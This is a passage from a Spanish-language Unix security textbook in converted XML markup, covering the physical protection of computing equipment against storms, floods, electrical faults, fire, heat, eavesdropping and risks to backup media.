nuestras m&#x00E1;quinas, especialmente si se trata de vibraciones cont&#x02CA;&#x0131;nuas: los primeros efectos
pueden ser problemas con los cabezales de los discos duros o con los circuitos integrados que se
da~nan en las placas. Para hacer frente a peque~nas vibraciones podemos utilizar plataformas
de goma donde situar a los equipos, de forma que la plataforma absorba la mayor parte de
los movimientos; incluso sin llegar a esto, una regla com&#x00FA;n es evitar que entren en contacto
equipos que poseen una electr&#x00F3;nica delicada con hardware m&#x00E1;s mec&#x00E1;nico, como las impresoras: estos
dispositivos no paran de generar vibraciones cuando est&#x00E1;n en funcionamiento, por lo que situar
una peque~na impresora encima de la CPU de una m&#x00E1;quina es una idea nefasta. Como dicen
algunos expertos en seguridad (<citation>[?]</citation>), el espacio en la sala de operaciones es un problema sin
importancia comparado con las consecuencias de fallos en un disco duro o en la placa base de un
ordenador.
  </para></section><!--end subsubsection--><!--l. 257--><section 
role="subsubsection"><title><anchor 
   id="x1-290002.2.2"  ></anchor>Tormentas el&#x00E9;ctricas</title>
<!--l. 258--><para>  Las tormentas con aparato el&#x00E9;ctrico, especialmente frecuentes en verano (cuando mucho personal se
encuentra de vacaciones, lo que las hace m&#x00E1;s peligrosas) generan subidas s&#x00FA;bitas de tensi&#x00F3;n in&#xFB01;nitamente

superiores a las que pueda generar un problema en la red el&#x00E9;ctrica, como veremos a continuaci&#x00F3;n. Si cae un
rayo sobre la estructura met&#x00E1;lica del edi&#xFB01;cio donde est&#x00E1;n situados nuestros equipos es casi seguro que
podemos ir pensando en comprar otros nuevos; sin llegar a ser tan dram&#x00E1;ticos, la ca&#x02CA;&#x0131;da de un rayo en un
lugar cercano puede inducir un campo magn&#x00E9;tico lo su&#xFB01;cientemente intenso como para destruir hardware
incluso protegido contra voltajes elevados.
<!--br/-->
<!--br/-->Sin embargo, las tormentas poseen un lado positivo: son predecibles con m&#x00E1;s o menos
exactitud, lo que permite a un administrador parar sus m&#x00E1;quinas y desconectarlas de la l&#x02CA;&#x0131;nea
el&#x00E9;ctrica <anchor 
   id="x1-29001f3"  ></anchor><footnote><para>     Al contrario de lo que mucha gente piensa, no basta s&#x00F3;lo con apagar un sistema para que se encuentre a
salvo.</para></footnote>.
Entonces, &#x00BF;cu&#x00E1;l es el problema? Aparte de las propias tormentas, el problema son los responsables de los
equipos: la ca&#x02CA;&#x0131;da de un rayo es algo poco probable &#x2013; pero no imposible &#x2013; en una gran ciudad donde existen
artilugios destinados justamente a atraer rayos de una forma controlada; tanto es as&#x02CA;&#x0131; que mucha gente ni
siquiera ha visto caer cerca un rayo, por lo que directamente tiende a asumir que eso no le va a suceder
nunca, y menos a sus equipos. Por tanto, muy pocos administradores se molestan en parar m&#x00E1;quinas y
desconectarlas ante una tormenta; si el fen&#x00F3;meno sucede durante las horas de trabajo y la tormenta es
fuerte, quiz&#x00E1;s s&#x02CA;&#x0131; que lo hace, pero si sucede un s&#x00E1;bado por la noche nadie va a ir a la sala de
operaciones a proteger a los equipos, y nadie antes se habr&#x00E1; tomado la molestia de protegerlos por
una simple previsi&#x00F3;n meteorol&#x00F3;gica. Si a esto a~nadimos lo que antes hemos comentado, que las
tormentas se producen con m&#x00E1;s frecuencia en pleno verano, cuando casi toda la plantilla est&#x00E1; de
vacaciones y s&#x00F3;lo hay un par de personas de guardia, tenemos el caldo de cultivo ideal para que una
amenaza que a priori no es muy grave se convierta en el &#xFB01;nal de algunos de nuestros equipos.
Conclusi&#x00F3;n: todos hemos de tomar m&#x00E1;s en serio a la Naturaleza cuando nos avisa con un par de
truenos&#x2026;
<!--br/-->
<!--br/-->Otra medida de protecci&#x00F3;n contra las tormentas el&#x00E9;ctricas hace referencia a la ubicaci&#x00F3;n de los medios
magn&#x00E9;ticos, especialmente las copias de seguridad; aunque hablaremos con m&#x00E1;s detalle de la protecci&#x00F3;n de los
backups en el punto  <ulink 
  url="#x1-380002.3.2"  ><!--ref: backups--></ulink>, de momento podemos adelantar que se han de almacenar lo m&#x00E1;s alejados posible de
la estructura met&#x00E1;lica de los edi&#xFB01;cios. Un rayo en el propio edi&#xFB01;cio, o en un lugar cercano, puede inducir un
campo electromagn&#x00E9;tico lo su&#xFB01;cientemente grande como para borrar de golpe todas nuestras cintas o discos,
lo que a~nade a los problemas por da~nos en el hardware la p&#x00E9;rdida de toda la informaci&#x00F3;n de nuestros
sistemas.
  </para></section><!--end subsubsection--><!--l. 299--><section 
role="subsubsection"><title><anchor 
   id="x1-300002.2.2"  ></anchor>Inundaciones y humedad</title>
<!--l. 300--><para>  Cierto grado de humedad es necesario para un correcto funcionamiento de nuestras m&#x00E1;quinas: en
ambientes extremadamente secos el nivel de electricidad est&#x00E1;tica es elevado, lo que, como veremos m&#x00E1;s tarde,
puede transformar un peque~no contacto entre una persona y un circuito, o entre diferentes componentes
de una m&#x00E1;quina, en un da~no irreparable al hardware y a la informaci&#x00F3;n. No obstante, niveles de humedad
elevados son perjudiciales para los equipos porque pueden producir condensaci&#x00F3;n en los circuitos integrados,
lo que origina cortocircuitos que evidentemente tienen efectos negativos sobre cualquier elemento
electr&#x00F3;nico de una m&#x00E1;quina.
<!--br/-->
<!--br/-->Controlar el nivel de humedad en los entornos habituales es algo innecesario, ya que por norma nadie
ubica estaciones en los lugares m&#x00E1;s h&#x00FA;medos o que presenten situaciones extremas; no obstante, ciertos
equipos son especialmente sensibles a la humedad, por lo que es conveniente consultar los
manuales de todos aquellos de los que tengamos dudas. Quiz&#x00E1;s sea necesario utilizar alarmas que se
activan al detectar condiciones de muy poca o demasiada humedad, especialmente en sistemas
de alta disponibilidad o de altas prestaciones, donde un fallo en un componente puede ser
crucial.
<!--br/-->
<!--br/-->Cuando ya no se habla de una humedad m&#x00E1;s o menos elevada sino de completas inundaciones, los
problemas generados son mucho mayores. Casi cualquier medio (una m&#x00E1;quina, una cinta, un router&#x2026;) que
entre en contacto con el agua queda autom&#x00E1;ticamente inutilizado, bien por el propio l&#x02CA;&#x0131;quido o bien por los
cortocircuitos que genera en los sistemas electr&#x00F3;nicos.
<!--br/-->
<!--br/-->Evidentemente, contra las inundaciones las medidas m&#x00E1;s efectivas son las de prevenci&#x00F3;n (frente a las de

detecci&#x00F3;n); podemos utilizar detectores de agua en los suelos o falsos suelos de las salas de
operaciones, y apagar autom&#x00E1;ticamente los sistemas en caso de que se activen. Tras apagar los
sistemas podemos tener tambi&#x00E9;n instalado un sistema autom&#x00E1;tico que corte la corriente: algo
muy com&#x00FA;n es intentar sacar los equipos &#x2013; previamente apagados o no &#x2013; de una sala que se est&#x00E1;
empezando a inundar; esto, que a primera vista parece lo l&#x00F3;gico, es el mayor error que se puede
cometer si no hemos desconectado completamente el sistema el&#x00E9;ctrico, ya que la mezcla de
corriente y agua puede causar incluso la muerte a quien intente salvar equipos. Por muy caro que
sea el hardware o por muy valiosa que sea la informaci&#x00F3;n a proteger, nunca ser&#x00E1;n magnitudes
comparables a lo que supone la p&#x00E9;rdida de vidas humanas. Otro error com&#x00FA;n relacionado con
los detectores de agua es situar a los mismos a un nivel superior que a los propios equipos a
salvaguardar (&#x00A1;incluso en el techo, junto a los detectores de humo!); evidentemente, cuando en estos
casos el agua llega al detector poco se puede hacer ya por las m&#x00E1;quinas o la informaci&#x00F3;n que
contienen.
<!--br/-->
<!--br/-->Medidas de protecci&#x00F3;n menos so&#xFB01;sticadas pueden ser la instalaci&#x00F3;n de un falso suelo por encima del suelo
real, o simplemente tener la precauci&#x00F3;n de situar a los equipos con una cierta elevaci&#x00F3;n respecto al suelo,
pero sin llegar a situarlos muy altos por los problemas que ya hemos comentado al hablar de terremotos y
vibraciones.
  </para></section><!--end subsubsection--></section><!--end subsection--><!--l. 344--><section 
role="subsection"><title><abbrev role="title-mark">2.2.3</abbrev><anchor 
   id="x1-310002.2.3"  ></anchor>Desastres del entorno</title>
<!--l. 345--><para>
  </para><!--l. 345--><section 
role="subsubsection"><title><anchor 
   id="x1-320002.2.3"  ></anchor>Electricidad</title>
<!--l. 346--><para>  Quiz&#x00E1;s los problemas derivados del entorno de trabajo m&#x00E1;s frecuentes son los relacionados con el sistema
el&#x00E9;ctrico que alimenta nuestros equipos; cortocircuitos, picos de tensi&#x00F3;n, cortes de &#xFB02;ujo&#x2026;a diario amenazan
la integridad tanto de nuestro hardware como de los datos que almacena o que circulan por
&#x00E9;l.
<!--br/-->
<!--br/-->El problema menos com&#x00FA;n en las instalaciones modernas son las subidas de tensi&#x00F3;n, conocidas como &#x2018;picos&#x2019;
porque generalmente duran muy poco: durante unas fracciones de segundo el voltaje que recibe un equipo
sube hasta sobrepasar el l&#x02CA;&#x0131;mite aceptable que dicho equipo soporta. Lo normal es que estos
picos apenas afecten al hardware o a los datos gracias a que en la mayor&#x02CA;&#x0131;a de equipos hay
instalados fusibles, elementos que se funden ante una subida de tensi&#x00F3;n y dejan de conducir la
corriente, provocando que la m&#x00E1;quina permanezca apagada. Disponga o no de fusibles el equipo a
proteger (lo normal es que s&#x02CA;&#x0131; los tenga) una medida efectiva y barata es utilizar tomas de
tierra para asegurar a&#x00FA;n m&#x00E1;s la integridad; estos mecanismos evitan los problemas de sobretensi&#x00F3;n
desviando el exceso de corriente hacia el suelo de una sala o edi&#xFB01;cio, o simplemente hacia
cualquier lugar con voltaje nulo. Una toma de tierra sencilla puede consistir en un buen conductor
conectado a los chasis de los equipos a proteger y a una barra maciza, tambi&#x00E9;n conductora, que se
introduce lo m&#x00E1;s posible en el suelo; el coste de la instalaci&#x00F3;n es peque~no, especialmente si lo
comparamos con las p&#x00E9;rdidas que supondr&#x02CA;&#x0131;a un incendio que afecte a todos o a una parte de nuestros
equipos.
<!--br/-->
<!--br/-->Incluso teniendo un sistema protegido con los m&#x00E9;todos anteriores, si la subida de tensi&#x00F3;n dura demasiado, o
si es demasiado r&#x00E1;pida, podemos sufrir da~nos en los equipos; existen acondicionadores de tensi&#x00F3;n comerciales
que protegen de los picos hasta en los casos m&#x00E1;s extremos, y que tambi&#x00E9;n se utilizan como &#xFB01;ltros
para ruido el&#x00E9;ctrico. Aunque en la mayor&#x02CA;&#x0131;a de situaciones no es necesario su uso, si nuestra
organizaci&#x00F3;n tiene problemas por el voltaje excesivo quiz&#x00E1;s sea conveniente instalar alguno de estos
aparatos.
<!--br/-->
<!--br/-->Un problema que los estabilizadores de tensi&#x00F3;n o las tomas de tierra no pueden solucionar es justamente el
contrario a las subidas de tensi&#x00F3;n: las bajadas, situaciones en las que la corriente desciende por debajo
del voltaje necesario para un correcto funcionamiento del sistema, pero sin llegar a ser lo
su&#xFB01;cientemente bajo para que la m&#x00E1;quina se apague (<citation>[?]</citation>). En estas situaciones la m&#x00E1;quina se va a

comportar de forma extra~na e incorrecta, por ejemplo no aceptando algunas instrucciones, no
completando escrituras en disco o memoria, etc. Es una situaci&#x00F3;n similar a la de una bombilla
que pierde intensidad moment&#x00E1;neamente por falta de corriente, pero trasladada a un sistema
que en ese peque~no intervalo ejecuta miles o millones de instrucciones y transferencias de
datos.
<!--br/-->
<!--br/-->Otro problema, much&#x02CA;&#x0131;simo m&#x00E1;s habituales que los anteriores en redes el&#x00E9;ctricas modernas, son los cortes en
el &#xFB02;uido el&#x00E9;ctrico que llega a nuestros equipos. Aunque un simple corte de corriente no suele
afectar al hardware, lo m&#x00E1;s peligroso (y que sucede en muchas ocasiones) son las idas y venidas
r&#x00E1;pidas de la corriente; en esta situaci&#x00F3;n, aparte de perder datos, nuestras m&#x00E1;quinas pueden sufrir
da~nos.
<!--br/-->
<!--br/-->La forma m&#x00E1;s efectiva de proteger nuestros equipos contra estos problemas de la corriente el&#x00E9;ctrica es
utilizar una SAI (Servicio de Alimentaci&#x00F3;n Ininterrumpido) conectada al elemento que queremos
proteger. Estos dispositivos mantienen un &#xFB02;ujo de corriente correcto y estable de corriente,
protegiendo as&#x02CA;&#x0131; los equipos de subidas, cortes y bajadas de tensi&#x00F3;n; tienen capacidad para seguir
alimentando las m&#x00E1;quinas incluso en caso de que no reciban electricidad (evidentemente no las
alimentan de forma inde&#xFB01;nida, sino durante un cierto tiempo &#x2013; el necesario para detener el sistema
de forma ordenada). Por tanto, en caso de fallo de la corriente el SAI informar&#x00E1; a la m&#x00E1;quina
Unix, que a trav&#x00E9;s de un programa como /sbin/powerd recibe la informaci&#x00F3;n y decide cuanto
tiempo de corriente le queda para poder pararse correctamente; si de nuevo vuelve el &#xFB02;ujo la
SAI vuelve a informar de este evento y el sistema desprograma su parada. As&#x02CA;&#x0131; de simple:
por poco m&#x00E1;s de diez mil pesetas podemos obtener una SAI peque~na, m&#x00E1;s que su&#xFB01;ciente para
muchos servidores, que nos va a librar de la mayor&#x02CA;&#x0131;a de los problemas relacionados con la red
el&#x00E9;ctrica.
<!--br/-->
<!--br/-->Un &#x00FA;ltimo problema contra el que ni siquiera las SAIs nos protegen es la corriente est&#x00E1;tica, un fen&#x00F3;meno
extra~no del que la mayor&#x02CA;&#x0131;a de gente piensa que no afecta a los equipos, s&#x00F3;lo a otras personas.
Nada m&#x00E1;s lejos de la realidad: simplemente tocar con la mano la parte met&#x00E1;lica de teclado o un
conductor de una placa puede destruir un equipo completamente. Se trata de corriente de
muy poca intensidad pero un alt&#x02CA;&#x0131;simo voltaje, por lo que aunque la persona no sufra ning&#x00FA;n
da~no &#x2013; s&#x00F3;lo un peque~no calambrazo &#x2013; el ordenador sufre una descarga que puede ser su&#xFB01;ciente
para destrozar todos sus componentes, desde el disco duro hasta la memoria RAM. Contra el
problema de la corriente est&#x00E1;tica existen muchas y muy baratas soluciones: spray antiest&#x00E1;tico,
ionizadores antiest&#x00E1;ticos&#x2026;No obstante en la mayor&#x02CA;&#x0131;a de situaciones s&#x00F3;lo hace falta un poco de
sentido com&#x00FA;n del usuario para evitar accidentes: no tocar directamente ninguna parte met&#x00E1;lica,
protegerse si debe hacer operaciones con el hardware, no mantener el entorno excesivamente
seco&#x2026;
  </para></section><!--end subsubsection--><!--l. 426--><section 
role="subsubsection"><title><anchor 
   id="x1-330002.2.3"  ></anchor>Ruido el&#x00E9;ctrico</title>
<!--l. 427--><para>  Dentro del apartado anterior podr&#x02CA;&#x0131;amos haber hablado del ruido el&#x00E9;ctrico como un problema m&#x00E1;s
relacionado con la electricidad; sin embargo este problema no es una incidencia directa de la corriente en
nuestros equipos, sino una incidencia relacionada con la corriente de otras m&#x00E1;quinas que pueden afectar al
funcionamiento de la nuestra. El ruido el&#x00E9;ctrico suele ser generado por motores o por maquinaria pesada,
pero tambi&#x00E9;n puede serlo por otros ordenadores o por multitud de aparatos, especialmente muchos de los
instalados en los laboratorios de organizaciones de I+D, y se transmite a trav&#x00E9;s del espacio o de l&#x02CA;&#x0131;neas
el&#x00E9;ctricas cercanas a nuestra instalaci&#x00F3;n.
<!--br/-->
<!--br/-->Para prevenir los problemas que el ruido el&#x00E9;ctrico puede causar en nuestros equipos lo m&#x00E1;s barato es intentar
no situar hardware cercano a la maquinaria que puede causar dicho ruido; si no tenemos m&#x00E1;s remedio que
hacerlo, podemos instalar &#xFB01;ltros en las l&#x02CA;&#x0131;neas de alimentaci&#x00F3;n que llegan hasta los ordenadores.
Tambi&#x00E9;n es recomendable mantener alejados de los equipos dispositivos emisores de ondas, como
tel&#x00E9;fonos m&#x00F3;viles, transmisores de radio o walkie-talkies; estos elementos puede incluso da~nar
permanentemente a nuestro hardware si tienen la su&#xFB01;ciente potencia de transmisi&#x00F3;n, o in&#xFB02;uir
directamente en elementos que pueden da~narlo como detectores de incendios o cierto tipo de
alarmas.

  </para></section><!--end subsubsection--><!--l. 447--><section 
role="subsubsection"><title><anchor 
   id="x1-340002.2.3"  ></anchor>Incendios y humo</title>
<!--l. 448--><para>  Una causa casi siempre relacionada con la electricidad son los incendios, y con ellos el humo;
aunque la causa de un fuego puede ser un desastre natural, lo habitual en muchos entornos
es que el mayor peligro de incendio provenga de problemas el&#x00E9;ctricos por la sobrecarga de la
red debido al gran n&#x00FA;mero de aparatos conectados al tendido. Un simple cortocircuito o un
equipo que se calienta demasiado pueden convertirse en la causa directa de un incendio en
el edi&#xFB01;cio, o al menos en la planta, donde se encuentran invertidos millones de pesetas en
equipamiento.
<!--br/-->
<!--br/-->Un m&#x00E9;todo efectivo contra los incendios son los extintores situados en el techo, que se activan
autom&#x00E1;ticamente al detectar humo o calor. Algunos de ellos, los m&#x00E1;s antiguos, utilizaban agua para apagar
las llamas, lo que provocaba que el hardware no llegara a sufrir los efectos del fuego si los extintores se
activaban correctamente, pero que quedara destrozado por el agua expulsada. Visto este problema, a
mitad de los ochenta se comenzaron a utilizar extintores de hal&#x00F3;n; este compuesto no conduce
electricidad ni deja residuos, por lo que resulta ideal para no da~nar los equipos. Sin embargo,
tambi&#x00E9;n el hal&#x00F3;n presentaba problemas: por un lado, resulta excesivamente contaminante para la
atm&#x00F3;sfera, y por otro puede ax&#xFB01;siar a las personas a la vez que acaba con el fuego. Por eso se
han sustituido los extintores de hal&#x00F3;n (aunque se siguen utilizando mucho hoy en d&#x02CA;&#x0131;a) por
extintores de di&#x00F3;xido de carbono, menos contaminante y menos perjudicial. De cualquier forma, al
igual que el hal&#x00F3;n el di&#x00F3;xido de carbono no es precisamente sano para los humanos, por lo que
antes de activar el extintor es conveniente que todo el mundo abandone la sala; si se trata de
sistemas de activaci&#x00F3;n autom&#x00E1;tica suelen avisar antes de expulsar su compuesto mediante un
pitido.
<!--br/-->
<!--br/-->Aparte del fuego y el calor generado, en un incendio existe un tercer elemento perjudicial para los equipos:
el humo, un potente abrasivo que ataca especialmente los discos magn&#x00E9;ticos y &#x00F3;pticos. Quiz&#x00E1;s ante un
incendio el da~no provocado por el humo sea insigni&#xFB01;cante en comparaci&#x00F3;n con el causado por el fuego y el
calor, pero hemos de recordar que puede existir humo sin necesidad de que haya un fuego: por ejemplo, en
salas de operaciones donde se fuma. Aunque muchos no apliquemos esta regla y fumemos demasiado &#x2013;
siempre es demasiado &#x2013; delante de nuestros equipos, ser&#x02CA;&#x0131;a conveniente no permitir esto; aparte de la
suciedad generada que se deposita en todas las partes de un ordenador, desde el teclado hasta el
monitor, generalmente todos tenemos el cenicero cerca de los equipos, por lo que el humo afecta
directamente a todos los componentes; incluso al ser algo m&#x00E1;s habitual que un incendio, se puede
considerar m&#x00E1;s perjudicial &#x2013; para los equipos y las personas &#x2013; el humo del tabaco que el de un
fuego.
<!--br/-->
<!--br/-->En muchos manuales de seguridad se insta a los usuarios, administradores, o al personal en general a
intentar controlar el fuego y salvar el equipamiento; esto tiene, como casi todo, sus pros y sus contras.
Evidentemente, algo l&#x00F3;gico cuando estamos ante un incendio de peque~nas dimensiones es intentar utilizar
un extintor para apagarlo, de forma que lo que podr&#x02CA;&#x0131;a haber sido una cat&#x00E1;strofe sea un simple susto o un
peque~no accidente. Sin embargo, cuando las dimensiones de las llamas son considerables lo &#x00FA;ltimo que
debemos hacer es intentar controlar el fuego nosotros mismos, arriesgando vidas para salvar
hardware; como suced&#x02CA;&#x0131;a en el caso de inundaciones, no importa el precio de nuestros equipos o
el valor de nuestra informaci&#x00F3;n: nunca ser&#x00E1;n tan importantes como una vida humana. Lo m&#x00E1;s
recomendable en estos casos es evacuar el lugar del incendio y dejar su control en manos de personal
especializado.
  </para></section><!--end subsubsection--><!--l. 501--><section 
role="subsubsection"><title><anchor 
   id="x1-350002.2.3"  ></anchor>Temperaturas extremas</title>
<!--l. 502--><para>  No hace falta ser un genio para comprender que las temperaturas extremas, ya sea un calor excesivo o
un frio intenso, perjudican gravemente a todos los equipos. Es recomendable que los equipos operen entre
10 y 32 grados Celsius (<citation>[?]</citation>), aunque peque~nas variaciones en este rango tampoco han de in&#xFB02;uir en la
mayor&#x02CA;&#x0131;a de sistemas.
<!--br/-->
<!--br/-->Para controlar la temperatura ambiente en el entorno de operaciones nada mejor que un acondicionador de
aire, aparato que tambi&#x00E9;n in&#xFB02;uir&#x00E1; positivamente en el rendimiento de los usuarios (las personas tambi&#x00E9;n

tenemos rangos de temperaturas dentro de los cuales trabajamos m&#x00E1;s c&#x00F3;modamente). Otra condici&#x00F3;n b&#x00E1;sica
para el correcto funcionamiento de cualquier equipo que &#x00E9;ste se encuentre correctamente ventilado, sin
elementos que obstruyan los ventiladores de la CPU. La organizaci&#x00F3;n f&#x02CA;&#x0131;sica del computador tambi&#x00E9;n es
decisiva para evitar sobrecalentamientos: si los discos duros, elementos que pueden alcanzar temperaturas
considerables, se encuentran excesivamente cerca de la memoria RAM, es muy probable que los m&#x00F3;dulos
acaben quem&#x00E1;ndose.
  </para></section><!--end subsubsection--></section><!--end subsection--></section><!--end section--><!--l. 518--><section 
role="section"><title><abbrev role="title-mark">2.3</abbrev><anchor 
   id="x1-360002.3"  ></anchor>Protecci&#x00F3;n de los datos</title>
<!--l. 519--><para>  La seguridad f&#x02CA;&#x0131;sica tambi&#x00E9;n implica una protecci&#x00F3;n a la informaci&#x00F3;n de nuestro sistema, tanto a la que est&#x00E1;
almacenada en &#x00E9;l como a la que se transmite entre diferentes equipos. Aunque los apartados comentados en
la anterior secci&#x00F3;n son aplicables a la protecci&#x00F3;n f&#x02CA;&#x0131;sica de los datos (ya que no olvidemos que si protegemos el
hardware tambi&#x00E9;n protegemos la informaci&#x00F3;n que se almacena o se transmite por &#x00E9;l), hay ciertos aspectos a
tener en cuenta a la hora de dise~nar una pol&#x02CA;&#x0131;tica de seguridad f&#x02CA;&#x0131;sica que afectan principalmente, aparte de
a los elementos f&#x02CA;&#x0131;sicos, a los datos de nuestra organizaci&#x00F3;n; existen ataques cuyo objetivo no es destruir el
medio f&#x02CA;&#x0131;sico de nuestro sistema, sino simplemente conseguir la informaci&#x00F3;n almacenada en dicho
medio.
  </para><!--l. 530--><section 
role="subsection"><title><abbrev role="title-mark">2.3.1</abbrev><anchor 
   id="x1-370002.3.1"  ></anchor>Eavesdropping</title>
<!--l. 532--><para>  La interceptaci&#x00F3;n o eavesdropping, tambi&#x00E9;n conocida por passive wiretapping (<citation>[?]</citation>) es un proceso mediante
el cual un agente capta informaci&#x00F3;n &#x2013; en claro o cifrada &#x2013; que no le iba dirigida; esta captaci&#x00F3;n puede
realizarse por much&#x02CA;&#x0131;simos medios (por ejemplo, capturando las radiaciones electromagn&#x00E9;ticas, como
veremos luego). Aunque es en principio un ataque completamente pasivo, lo m&#x00E1;s peligroso del eavesdropping
es que es muy dif&#x02CA;&#x0131;cil de detectar mientras que se produce, de forma que un atacante puede
capturar informaci&#x00F3;n privilegiada y claves para acceder a m&#x00E1;s informaci&#x00F3;n sin que nadie se de
cuenta hasta que dicho atacante utiliza la informaci&#x00F3;n capturada, convirtiendo el ataque en
activo.
<!--br/-->
<!--br/-->Un medio de interceptaci&#x00F3;n bastante habitual es el sni&#xFB03;ng, consistente en capturar
tramas que circulan por la red mediante un programa ejecut&#x00E1;ndose en una m&#x00E1;quina
conectada a ella o bien mediante un dispositivo que se engancha directamente el
cableado <anchor 
   id="x1-37001f4"  ></anchor><footnote><para>     En este caso tambi&#x00E9;n se suele llamar a esta actividad wiretapping.</para></footnote>.
Estos dispositivos, denominados sni&#xFB00;ers de alta impedancia, se conectan en paralelo con el cable
de forma que la impedancia total del cable y el aparato es similar a la del cable solo, lo que
hace dif&#x02CA;&#x0131;cil su detecci&#x00F3;n. Contra estos ataques existen diversas soluciones; la m&#x00E1;s barata a nivel
f&#x02CA;&#x0131;sico es no permitir la existencia de segmentos de red de f&#x00E1;cil acceso, lugares id&#x00F3;neos para que
un atacante conecte uno de estos aparatos y capture todo nuestro tr&#x00E1;&#xFB01;co. No obstante esto
resulta dif&#x02CA;&#x0131;cil en redes ya instaladas, donde no podemos modi&#xFB01;car su arquitectura; en estos
existe una soluci&#x00F3;n generalmente gratuita pero que no tiene mucho que ver con el nivel f&#x02CA;&#x0131;sico: el
uso de aplicaciones de cifrado para realizar las comunicaciones o el almacenamiento de la
informaci&#x00F3;n (hablaremos m&#x00E1;s adelante de algunas de ellas). Tampoco debemos descuidar las
tomas de red libres, donde un intruso con un portatil puede conectarse para capturar tr&#x00E1;&#xFB01;co; es
recomendable analizar regularmente nuestra red para veri&#xFB01;car que todas las m&#x00E1;quinas activas est&#x00E1;n
autorizadas.
<!--br/-->
<!--br/-->Como soluciones igualmente efectivas contra la interceptaci&#x00F3;n a nivel f&#x02CA;&#x0131;sico podemos citar el uso de
dispositivos de cifra (no simples programas, sino hardware), generalmente chips que implementan
algoritmos como DES; esta soluci&#x00F3;n es muy poco utilizada en entornos de I+D, ya que es much&#x02CA;&#x0131;simo m&#x00E1;s cara
que utilizar implementaciones software de tales algoritmos y en muchas ocasiones la &#x00FA;nica diferencia entre
los programas y los dispositivos de cifra es la velocidad. Tambi&#x00E9;n se puede utilizar, como soluci&#x00F3;n
m&#x00E1;s cara, el cableado en vac&#x02CA;&#x0131;o para evitar la interceptaci&#x00F3;n de datos que viajan por la red: la
idea es situar los cables en tubos donde arti&#xFB01;cialmente se crea el vac&#x02CA;&#x0131;o o se inyecta aire a
presi&#x00F3;n; si un atacante intenta &#x2018;pinchar&#x2019; el cable para interceptar los datos, rompe el vac&#x02CA;&#x0131;o o
el nivel de presi&#x00F3;n y el ataque es detectado inmediatamente. Como decimos, esta soluci&#x00F3;n es
enormemente cara y s&#x00F3;lamente se aplica en redes de per&#x02CA;&#x0131;metro reducido para entornos de alta

seguridad.
<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar este punto debemos recordar un peligro que muchas veces se ignora: el de la
interceptaci&#x00F3;n de datos emitidos en forma de sonido o simple ruido en nuestro entorno de operaciones.
Imaginemos una situaci&#x00F3;n en la que los responsables de la seguridad de nuestra organizaci&#x00F3;n se reunen para
discutir nuevos mecanismos de protecci&#x00F3;n; todo lo que en esa reuni&#x00F3;n se diga puede ser capturado por
multitud de m&#x00E9;todos, algunos de los cuales son tan simples que ni siquiera se contemplan en los planes de
seguridad. Por ejemplo, una simple tarjeta de sonido instalada en un PC situado en la sala de reuniones
puede transmitir a un atacante todo lo que se diga en esa reuni&#x00F3;n; mucho m&#x00E1;s simple y sencillo: un
tel&#x00E9;fono mal colgado &#x2013; intencionada o inintencionadamente &#x2013; tambi&#x00E9;n puede transmitir informaci&#x00F3;n
muy &#x00FA;til para un potencial enemigo. Para evitar estos problemas existen numerosos m&#x00E9;todos:
por ejemplo, en el caso de los tel&#x00E9;fonos &#xFB01;jos suele ser su&#xFB01;ciente un poco de atenci&#x00F3;n y sentido
com&#x00FA;n, ya que basta con comprobar que est&#x00E1;n bien colgados&#x2026;o incluso desconectados de la red
telef&#x00F3;nica. El caso de los m&#x00F3;viles suele ser algo m&#x00E1;s complejo de controlar, ya que su peque~no
tama~no permite camu&#xFB02;arlos f&#x00E1;cilmente; no obstante, podemos instalar en la sala de reuniones un
sistema de aislamiento para bloquear el uso de estos tel&#x00E9;fonos: se trata de sistemas que ya se
utilizan en ciertos entornos (por ejemplo en conciertos musicales) para evitar las molestias de un
m&#x00F3;vil sonando, y que trabajan bloqueando cualquier transmisi&#x00F3;n en los rangos de frecuencias
en los que trabajan los diferentes operadores telef&#x00F3;nicos. Otra medida preventiva (ya no para
voz, sino para prevenir la fuga de datos v&#x02CA;&#x0131;a el ruido ambiente) muy &#x00FA;til &#x2013; y no muy cara &#x2013;
puede ser sustituir todos los tel&#x00E9;fonos &#xFB01;jos de disco por tel&#x00E9;fonos de teclado, ya que el ruido de
un disco al girar puede permitir a un pirata deducir el n&#x00FA;mero de tel&#x00E9;fono marcado desde ese
aparato.
  </para></section><!--end subsection--><!--l. 605--><section 
role="subsection"><title><abbrev role="title-mark">2.3.2</abbrev><anchor 
   id="x1-380002.3.2"  ></anchor>Backups</title>
<!--l. 607--><para>  En este apartado no vamos a hablar de las normas para establecer una pol&#x02CA;&#x0131;tica de realizaci&#x00F3;n de copias de
seguridad correcta, ni tampoco de los mecanismos necesarios para implementarla o las precauciones que
hay que tomar para que todo funcione correctamente; el tema que vamos a tratar en este apartado es la
protecci&#x00F3;n f&#x02CA;&#x0131;sica de la informaci&#x00F3;n almacenada en backups, esto es, de la protecci&#x00F3;n de los diferentes medios
donde residen nuestras copias de seguridad. Hemos de tener siempre presente que si las copias
contienen toda nuestra informaci&#x00F3;n tenemos que protegerlas igual que protegemos nuestros
sistemas.
<!--br/-->
<!--br/-->Un error muy habitual es almacenar los dispositivos de backup en lugares muy cercanos a la sala de
operaciones, cuando no en la misma sala; esto, que en principio puede parecer correcto (y c&#x00F3;modo si
necesitamos restaurar unos archivos) puede convertirse en un problema: imaginemos simplemente que se
produce un incendio de grandes dimensiones y todo el edi&#xFB01;cio queda reducido a cenizas. En
este caso extremo tendremos que unir al problema de perder todos nuestros equipos &#x2013; que
seguramente cubrir&#x00E1; el seguro, por lo que no se puede considerar una cat&#x00E1;strofe &#x2013; el perder tambi&#x00E9;n
todos nuestros datos, tanto los almacenados en los discos como los guardados en backups (esto
evidentemente no hay seguro que lo cubra). Como podemos ver, resulta recomendable guardar
las copias de seguridad en una zona alejada de la sala de operaciones, aunque en este caso
descentralizemos la seguridad y tengamos que proteger el lugar donde almacenamos los backups igual que
protegemos la propia sala o los equipos situados en ella, algo que en ocasiones puede resultar
caro.
<!--br/-->
<!--br/-->Tambi&#x00E9;n suele ser com&#x00FA;n etiquetar las cintas donde hacemos copias de seguridad con abundante informaci&#x00F3;n
sobre su contenido (sistemas de &#xFB01;cheros almacenados, d&#x02CA;&#x0131;a y hora de la realizaci&#x00F3;n, sistema al que
corresponde&#x2026;); esto tiene una parte positiva y una negativa. Por un lado, recuperar un &#xFB01;chero es r&#x00E1;pido: s&#x00F3;lo
tenemos que ir leyendo las etiquetas hasta encontrar la cinta adecuada. Sin embargo, si nos paramos
